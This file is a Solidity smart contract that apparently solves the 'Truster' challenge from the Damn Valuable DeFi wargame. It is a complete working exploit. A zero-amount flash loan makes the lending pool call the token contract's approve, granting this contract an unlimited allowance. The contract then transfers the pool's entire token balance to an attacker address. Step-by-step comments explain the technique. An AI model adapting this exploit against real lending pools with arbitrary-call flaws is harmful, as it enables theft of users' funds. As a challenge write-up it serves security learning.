// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface TrustLenderPool {
        function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract hackTruster{
    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }
    function hackit(address poolContractAddress, address attackerAddress) external{
        // Step 1 : Create the malicious data to send as calldata to the lender pool function.
        // Note: This data approves tokens of the pool to this contract.
        // It will be called by TrusterLenderPool. 
        bytes memory malciousData = abi.encodeWithSignature("approve(address,uint256)", address(this) , type(uint).max);
 
        //Step 2 : Change the target address to the token address itself !
        // Note: Ideally borrower and target should be related. As in flashloan tokens are transferred to borrower and target should have some kind of mechanism to repay flashloan tokens. 
        address _target = address(damnValuableToken);

        //Step 3 : Now we call the flashloan and pass the data. 
        TrustLenderPool _flashLoanPool = TrustLenderPool(poolContractAddress);
        _flashLoanPool.flashLoan(0, address(this), _target, malciousData);

        //Step 4 : By now the pool would have approved us the token and we now transfer those token to the attacker's address. 
        uint _poolBalance = damnValuableToken.balanceOf(poolContractAddress);
        damnValuableToken.transferFrom(poolContractAddress, attackerAddress, _poolBalance);

    }
}